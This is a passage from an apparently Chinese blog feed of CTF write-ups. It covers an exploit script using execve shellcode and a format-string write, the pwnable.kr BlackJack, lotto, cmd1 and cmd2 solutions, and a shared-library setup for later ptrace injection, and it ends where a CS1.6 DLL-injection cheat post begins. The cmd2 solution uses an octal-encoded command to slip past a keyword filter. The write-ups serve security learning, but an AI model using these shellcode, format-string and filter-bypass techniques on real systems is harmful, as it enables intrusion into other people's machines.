class="hljs-string">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;What should your character\&#x27;s name be:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;hvnt3r&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;So, where you will go?east or up?:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;east&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;go into there(1), or leave(0)?:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;\&#x27;Give me an address\&#x27;&#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(arr_addr))<br>io.recvuntil(<span class="hljs-string">&#x27;And, you wish is:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;%85c%7$n&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Wizard: I will help you! USE YOU SPELL&#x27;</span>)<br>io.sendline(payload2)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">cyberpeace&#123;e835aafd1184958de3f77<span class="hljs-number">27a97536540</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>ret2libc</p><p><a href="https://www.freebuf.com/articles/system/193646.html">Pwntools之DynELF原理探究</a></p><p>flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">cyberpeace</span><span class="hljs-template-variable">&#123;a37050cd56a9dc4f19b4caff856ef86f&#125;</span><br></code></pre></td></tr></table></figure><hr><blockquote><p>最近工作很忙真是抽不出时间更新博客呢🙃</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>二进制安全</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux动态链接库.so的生成与使用</title>
    <link href="/2019/08/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93-so%E7%9A%84%E7%94%9F%E6%88%90%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2019/08/Linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93-so%E7%9A%84%E7%94%9F%E6%88%90%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>用到以下三个文件，为以后展开相关攻击过程做铺垫。</p><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">print_test</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>print_test();<br>sleep(<span class="hljs-number">5</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><span id="more"></span><p>lib_ptrace_normal.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">print_test</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I am good guy&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>lib_ptrace_attack.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">print_test</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I am bad guy :P&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用如下命令编译so文件：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">test<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~/ptrace</span><span class="hljs-variable">$ </span>gcc -fPIC -shared lib_ptrace_normal.cpp  -o lib_normal.so<br>test<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~/ptrace</span><span class="hljs-variable">$ </span>gcc -fPIC -shared lib_ptrace_attack.cpp  -o lib_attack.so<br></code></pre></td></tr></table></figure><p>参数说明：</p><blockquote><p>如果想创建一个动态链接库，可以使用 GCC 的<code>-shared</code>选项。输入文件可以是源文件、汇编文件或者目标文件。</p><p>另外还得结合<code>-fPIC</code>选项。-fPIC 选项作用于编译阶段，告诉编译器产生与位置无关代码（Position-Independent Code）；这样一来，产生的代码中就没有绝对地址了，全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。 </p></blockquote><p>编辑<code>/etc/ld.so.conf.d/libc.conf</code>，在文件末尾添加生成so文件的目录，然后执行<code>sudo ldconfig</code>使设置生效。</p><p>之后执行来将 <code>main.c</code> 和 <code>lib_normal.so</code> 一起编译成<code>main.out</code>，当 <code>main.out</code> 运行时，会动态地加载链接库 <code>lib_normal.so</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc main.c -L. -l_normal -o main.out<br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>-L</code>：指定<code>lib</code>文件的目录，本例中<code>lib_normal.so</code>与<code>main.c</code>处于同一目录下，所以使用<code>.</code>表示当前目录，如需指定其他目录可以写成：<code>-L/usr/lib/xxx</code>的形式</li><li><code>-l</code>：指定lib文件的文件名称，在本例中将<code>lib_normal.so</code>分解为三部分：<code>lib + _normal + .so</code>，-l参数之后仅需写这三部分的中间部分即<code>_normal</code>。</li></ul><p>执行<code>ldd</code>命令查看<code>main.out</code>的链接情况，可以看到系统可以找到<code>lib_normal.so</code>的位置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>@ubuntu:~/ptrace$ ldd main.out <br>linux-vdso.so.1 =&gt;  (0x00007fff045df000)<br>lib_normal.so =&gt; /home/test/ptrace/lib_normal.so (0x00007fa8428c0000)<br>libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa8424f7000)<br>/lib64/ld-linux-x86-64.so.2 (0x000055ca59221000)<br></code></pre></td></tr></table></figure><p>此时运行<code>main.out</code>，运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>@ubuntu:~/ptrace$ ./main.out <br><br>I am good guy<br>I am good guy<br>I am good guy<br><br></code></pre></td></tr></table></figure><blockquote><p>此处有一点疑问，为何在程序刚运行时缺少了一次<code>print_test()</code>的调用，直接打印了<code>\n</code>？个人猜想是虚拟环境磁盘IO性能差导致此函数在so文件未被成功加载的时候跳过了？</p></blockquote><p>Done!🍟</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二进制安全</tag>
      
      <tag>Linux</tag>
      
      <tag>Linux动态链接库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwnable.kr_Part_1_15/21</title>
    <link href="/2019/08/Pwnable-kr-Part-1-15-21/"/>
    <url>/2019/08/Pwnable-kr-Part-1-15-21/</url>
    
    <content type="html"><![CDATA[<h2 id="Pwnable-kr-BlackJack-逻辑漏洞"><a href="#Pwnable-kr-BlackJack-逻辑漏洞" class="headerlink" title="Pwnable.kr-BlackJack-逻辑漏洞"></a>Pwnable.kr-BlackJack-逻辑漏洞</h2><p>游戏代码在这里:<a href="https://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html">https://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</a></p><p>查看代码发现代码量很多，以为很复杂，但静下心看一下发现其实很简单，大部分代码用来实现游戏逻辑，获取flag的条件是成为百万富翁，就是使自己的余额大于一百万，游戏规则介绍中也说了，不要试着真去赌，因为每一把都是随机的，很可能一夜回到解放前，因此要寻找题目中的漏洞，按照经验，这种题出现漏洞可能是整数溢出或者是数据校验不严格，然后我发现题目中对用户输入赌注的地方缺乏负数校验：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">betting</span><span class="hljs-params">()</span> <span class="hljs-comment">//Asks user amount to bet</span><br>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\nEnter Bet: $&quot;</span>);<br> <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;bet);<br><br> <span class="hljs-keyword">if</span> (bet &gt; cash) <span class="hljs-comment">//If player tries to bet more money than player has</span><br> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nYou cannot bet more money than you have.&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter Bet: &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;bet);<br>        <span class="hljs-keyword">return</span> bet;<br> &#125;<br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> bet;<br>&#125; <span class="hljs-comment">// End Function</span><br></code></pre></td></tr></table></figure><span id="more"></span><p>而在游戏主要逻辑中也没有对输入的赌注进行进一步验证而是直接参与了运算：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">stay</span><span class="hljs-params">()</span> <span class="hljs-comment">//Function for when user selects &#x27;Stay&#x27;</span><br>&#123;<br>     dealer(); <span class="hljs-comment">//If stay selected, dealer continues going</span><br>     <span class="hljs-keyword">if</span>(dealer_total&gt;=<span class="hljs-number">17</span>)<br>     &#123;<br>      <span class="hljs-keyword">if</span>(player_total&gt;=dealer_total) <span class="hljs-comment">//If player&#x27;s total is more than dealer&#x27;s total, win</span><br>      &#123;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nUnbelievable! You Win!\n&quot;</span>);<br>         won = won+<span class="hljs-number">1</span>;<br>         cash = cash+bet;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);<br>         dealer_total=<span class="hljs-number">0</span>;<br>         askover();<br>      &#125;<br>      <span class="hljs-keyword">if</span>(player_total&lt;dealer_total) <span class="hljs-comment">//If player&#x27;s total is less than dealer&#x27;s total, loss</span><br>      &#123;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nDealer Has the Better Hand. You Lose.\n&quot;</span>);<br>         loss = loss+<span class="hljs-number">1</span>;<br>         cash = cash - bet;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);<br>         dealer_total=<span class="hljs-number">0</span>;<br>         askover();<br>      &#125;<br>      <span class="hljs-keyword">if</span>(dealer_total&gt;<span class="hljs-number">21</span>) <span class="hljs-comment">//If dealer&#x27;s total is more than 21, win</span><br>      &#123;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nUnbelievable! You Win!\n&quot;</span>);<br>         won = won+<span class="hljs-number">1</span>;<br>         cash = cash+bet;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);<br>         dealer_total=<span class="hljs-number">0</span>;<br>         askover();<br>      &#125;<br>     &#125;<br>     <span class="hljs-keyword">else</span><br>     &#123;<br>         stay();<br>     &#125;<br>     <br>&#125; <span class="hljs-comment">// End Function</span><br></code></pre></td></tr></table></figure><p>因此直接输入 一个超大的负数即可获得flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">Enter Bet: -1000000<br><br><br>Would You Like to Hit or Stay?<br>Please Enter H to Hit or S to Stay.<br>S<br><br>You Have Chosen to Stay at 10. Wise Decision!<br><br>The Dealer Has a Total of 20<br>Dealer Has the Better Hand. You Lose.<br><br>You have 4 Wins and 6 Losses. Awesome!<br><br>Would You Like To Play Again?<br>Please Enter Y <span class="hljs-keyword">for</span> Yes or N <span class="hljs-keyword">for</span> No<br>y<br>YaY_I_AM_A_MILLIONARE_LOL<br><br><br>Cash: <span class="hljs-variable">$1010500</span><br>-------<br>|C    |<br>|  8  |<br>|    C|<br>-------<br><br>Your Total is 8<br><br>The Dealer Has a Total of 3<br><br>Enter Bet: $<br><br></code></pre></td></tr></table></figure><p>以上解法可能是非预期解，还有一种解法是betting()函数中没有对bet的值进行二次校验，可以连续两次输入大于500的数，因为第二次输入就没有比较的过程了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">betting</span><span class="hljs-params">()</span> <span class="hljs-comment">//Asks user amount to bet</span><br>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\nEnter Bet: $&quot;</span>);<br> <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;bet);<br><br> <span class="hljs-keyword">if</span> (bet &gt; cash) <span class="hljs-comment">//If player tries to bet more money than player has</span><br> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nYou cannot bet more money than you have.&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter Bet: &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;bet);<br>        <span class="hljs-keyword">return</span> bet;<br> &#125;<br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> bet;<br>&#125; <span class="hljs-comment">// End Function</span><br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">YaY_I_AM_<span class="hljs-built_in">A_MILLIONARE</span>_LOL<br></code></pre></td></tr></table></figure><h2 id="Pwnable-kr-lotto-逻辑漏洞"><a href="#Pwnable-kr-lotto-逻辑漏洞" class="headerlink" title="Pwnable.kr-lotto-逻辑漏洞"></a>Pwnable.kr-lotto-逻辑漏洞</h2><p>本题很简单，在判断乐透数字的时候用了一个双层for循环，但是没有检查用户输入的6个数字是否一样，如果lotto数字是123456，此时用户只需输入任意一个lotto数字6次即可大大提高中奖概率：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++)&#123;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">6</span>; j++)&#123;<br><span class="hljs-keyword">if</span>(lotto[i] == submit[j])&#123;<br>match++;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">sorry mom... I FORGOT to<span class="hljs-built_in"> check </span>duplicate numbers...<span class="hljs-keyword"> :</span>(<br></code></pre></td></tr></table></figure><h2 id="Pwnable-kr-cmd1-Linux环境变量科普"><a href="#Pwnable-kr-cmd1-Linux环境变量科普" class="headerlink" title="Pwnable.kr-cmd1-Linux环境变量科普"></a>Pwnable.kr-cmd1-Linux环境变量科普</h2><p>这道题就是科普一下PATH，代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">filter</span><span class="hljs-params">(<span class="hljs-type">char</span>* cmd)</span>&#123;<br>        <span class="hljs-type">int</span> r=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;flag&quot;</span>)!=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;sh&quot;</span>)!=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;tmp&quot;</span>)!=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> r;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[], <span class="hljs-type">char</span>** envp)</span>&#123;<br>        putenv(<span class="hljs-string">&quot;PATH=/thankyouverymuch&quot;</span>);<br>        <span class="hljs-keyword">if</span>(filter(argv[<span class="hljs-number">1</span>])) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        system( argv[<span class="hljs-number">1</span>] );<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可见不能直接<code>cat flag</code>，看环境变量，进入<code>/tmp/thankyouverymuch</code>目录，发现已经有人帮我们写好文件了hh，那就直接拿来用吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd1@prowl:/tmp/thankyouverymuch$ /home/cmd1/cmd1 ./test<br>mommy now I get what PATH environment is <span class="hljs-keyword">for</span> :)<br></code></pre></td></tr></table></figure><h2 id="Pwnable-kr-cmd2-Linux-bash"><a href="#Pwnable-kr-cmd2-Linux-bash" class="headerlink" title="Pwnable.kr-cmd2-Linux_bash"></a>Pwnable.kr-cmd2-Linux_bash</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">filter</span><span class="hljs-params">(<span class="hljs-type">char</span>* cmd)</span>&#123;<br>        <span class="hljs-type">int</span> r=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;=&quot;</span>)!=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;PATH&quot;</span>)!=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;export&quot;</span>)!=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;/&quot;</span>)!=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;`&quot;</span>)!=<span class="hljs-number">0</span>;<br>        r += <span class="hljs-built_in">strstr</span>(cmd, <span class="hljs-string">&quot;flag&quot;</span>)!=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> r;<br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span>** environ;<br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_env</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">char</span>** p;<br>        <span class="hljs-keyword">for</span>(p=environ; *p; p++) <span class="hljs-built_in">memset</span>(*p, <span class="hljs-number">0</span>, <span class="hljs-built_in">strlen</span>(*p));<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[], <span class="hljs-type">char</span>** envp)</span>&#123;<br>        delete_env();<br>        putenv(<span class="hljs-string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);<br>        <span class="hljs-keyword">if</span>(filter(argv[<span class="hljs-number">1</span>])) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, argv[<span class="hljs-number">1</span>]);<br>        system( argv[<span class="hljs-number">1</span>] );<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这道题是上一题的升级，不能用环境变量了，此时考虑使用bash自身特性绕过过滤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd2@prowl:~$ ./cmd2 <span class="hljs-string">&#x27;$(echo &quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&quot;)&#x27;</span><br>$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&quot;</span>)<br>FuN_w1th_5h3ll_v4riabl3s_haha<br><br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Fu<span class="hljs-symbol">N_w1</span>th_<span class="hljs-number">5</span>h<span class="hljs-number">3</span>ll_v<span class="hljs-number">4</span>riabl<span class="hljs-number">3</span>s_haha<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>Pwnable.kr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS1.6DLL注入外挂</title>
    <link href="/2019/07/CS1-6DLL%E6%B3%A8%E5%85%A5%E5%A4%96%E6%8C%82/"/>
    <url>/2019/07/CS1-6DLL%E6%B3%A8%E5%85%A5%E5%A4%96%E6%8C%82/</url>
    
    <content type="html"><![CDATA[<p>研究外挂只是想学一下r0,r3攻防对抗，不干坏事，乖巧.jpg</p><p>这一次做一下锁血</p><p>首先常规操作获取血量地址：<br><img src="https://i.loli.net/2019/07/22/5d35d4989bfc534573.png"></p><span id="more"></span><p>进程注入相关代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllinjecter.cpp : 此文件包含 &quot;main&quot; 